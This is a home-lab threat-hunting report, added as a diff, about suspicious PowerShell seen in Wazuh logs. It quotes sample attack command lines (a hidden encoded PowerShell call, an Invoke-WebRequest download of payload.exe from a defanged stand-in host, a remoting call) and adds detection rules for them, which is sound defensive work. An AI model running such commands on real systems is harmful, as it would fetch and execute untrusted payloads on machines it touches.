@@ -1,0 +1,94 @@
+INTRODUCTION -
+
+  This report documents a proactive threat hunting exercise conducted in the Wazuh home lab environment. The objective was to identify malicious or suspicious behaviors within collected endpoint logs, analyze them, and create new detection rules to improve future visibility and response.
+
+INITIAL FINDING -
+
+  During routine threat hunting, an alert from Wazuh highlighted PowerShell execution containing the -enc (encoded command) attribute, which is commonly used by attackers to obfuscate malicious payloads.
+
+  Alert details (sample from Wazuh):
+
+    Rule triggered: windows-powershell
+    Agent name: DESKTOP-GSG0OEO
+    Event ID: 4104 (PowerShell Script Block Logging)
+    Command line: powershell.exe -nop -w hidden -enc SQBmACgA...
+    Severity: 7 (High)
+    Timestamp: 2025-08-30T12:34:56Z
+
+  This raised suspicion, as legitimate administrators rarely use encoded PowerShell commands.
+
+HYPOTHESIS -
+
+  “If attackers are leveraging PowerShell with encoded commands, then further malicious or obfuscated PowerShell activity may exist in the environment.”
+  This hypothesis guided the next hunting steps: filtering, analyzing, and correlating all PowerShell-related alerts to uncover patterns of misuse.
+
+FURTHER FINDINGS -
+
+  By filtering alerts where the process name contained powershell.exe, additional suspicious activities were identified:
+
+  4.1 Suspicious Download Activity
+
+    Event ID: 4104
+    Command line:
+    powershell.exe -nop -c "Invoke-WebRequest http://malicious[.]site/payload.exe -OutFile C:\Users\Public\payload.exe"
+    Detection: Possible file download from untrusted domain.
+
+  4.2 Execution of Downloaded Payload
+
+    Event ID: 4688 (New Process Creation)
+    Command line: C:\Users\Public\payload.exe
+    Detection: Execution of suspicious binary downloaded via PowerShell.
+
+  4.3 Lateral Movement Attempt
+
+    Event ID: 4104
+    Command line: Invoke-Command -ComputerName SERVER01 -ScriptBlock { whoami }
+    Detection: Potential attempt to execute remote code via PowerShell remoting.
+
+OVERALL FINDINGS - 
+
+  The hunting exercise confirmed that encoded and obfuscated PowerShell was used to:
+
+    Execute hidden scripts (-nop -w hidden -enc)
+    Download external payloads (Invoke-WebRequest)
+    Attempt lateral movement (Invoke-Command).
+
+  Such activity is highly indicative of adversarial TTPs aligned with MITRE ATT&CK techniques:
+
+  T1059.001 – Command and Scripting Interpreter: PowerShell
+  T1105 – Ingress Tool Transfer
+  T1021.006 – Remote Services: PowerShell Remoting
+
+NEW RULE CREATION - 
+
+  To strengthen detection, a custom Wazuh rule was created to catch suspicious PowerShell activity.
+
+  Rule Example (for local_rules.xml):
+
+    <group name="windows,">
+      <rule id="100100" level="10">
+        <if_group>sysmon_event1, windows</if_group>
+        <field name="win.eventdata.CommandLine" type="pcre2">(?i)(powershell\.exe.*-enc)</field>
+        <description>Suspicious PowerShell encoded command detected</description>
+        <mitre>
+          <id>T1059.001</id>
+        </mitre>
+      </rule>
+
+      <rule id="100101" level="10">
+        <if_group>sysmon_event1, windows</if_group>
+        <field name="win.eventdata.CommandLine" type="pcre2">(?i)(Invoke-WebRequest|IEX)</field>
+        <description>Suspicious PowerShell web request detected</description>
+        <mitre>
+          <id>T1105</id>
+        </mitre>
+      </rule>
+    </group>
+
+
+  These rules will trigger high-severity alerts when encoded PowerShell or suspicious web requests are detected in the future.
+
+CONCLUSION - 
+
+  This hunting exercise demonstrated the value of proactive log analysis in identifying hidden threats that bypass traditional detection. The encoded PowerShell command served as the initial trigger, leading to discovery of payload download and execution activity, as well as potential lateral movement attempts.
+  By creating new detection rules, the SOC team can now detect, triage, and respond faster to similar threats in real-world environments.
